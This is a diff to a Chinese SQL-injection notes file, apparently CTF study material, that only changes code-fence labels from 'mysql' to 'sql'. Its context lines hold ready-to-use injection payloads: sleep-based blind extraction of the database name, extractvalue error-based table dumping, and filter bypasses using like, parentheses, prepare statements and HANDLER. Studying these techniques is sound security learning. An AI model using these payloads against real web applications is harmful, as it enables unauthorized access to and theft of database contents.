@@ -149,13 +149,13 @@ mid, substr, left, right
 对于第一个字符，遍历所有可能的取值，如果正确，则sleep，根据时间判断是否正确。
 
 可以先判断如何闭合：
-```mysql
+```sql
 ' and select if(1=1,sleep(3),0);
 ```
 如3s后响应则正确闭合.
 
 然后判断数据库名称:
-```mysql
+```sql
 ' and select if(ascii(substr(database(),1,1))=109,sleep(3),0);
 ```
 3s后响应则数据库的第一个字符是'm'
@@ -415,7 +415,7 @@ print(f"\033[32m{data}\033[0m")
 由于 '(' 是非法正则，所以报错
 
 例如:
-```mysql
+```sql
 1' and extractvalue(1,concat(0x7e,(select substr(group_concat(table_name), 1, 31) from information_schema.tables where table_schema=database()))) #
 ```
 其中0x7e是让路径报错的关键, 且放在concat的第一个位置
@@ -470,7 +470,7 @@ procedure注入（**5.0.0< MySQL <5.6.6**）
 ## 过滤
 1. 过滤等号 ---> like
 2. 过滤空格 ---> 括号
-```mysql
+```sql
 select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))
 ```
 
@@ -478,14 +478,14 @@ select(group_concat(table_name))from(information_schema.tables)where(table_schem
 4. substr ---> right
 5. 过滤select
 	1. 用prepare
-```mysql
+```sql
 -1';
 set @sql = CONCAT('se','lect * from `1919810931114514`;');
 prepare stmt from @sql;
 EXECUTE stmt;
 ```
 	 2. handler语句
-```mysql
+```sql
 1';
 handler $TABLE_NAME open;
 handler $TABLE_NAME read first;
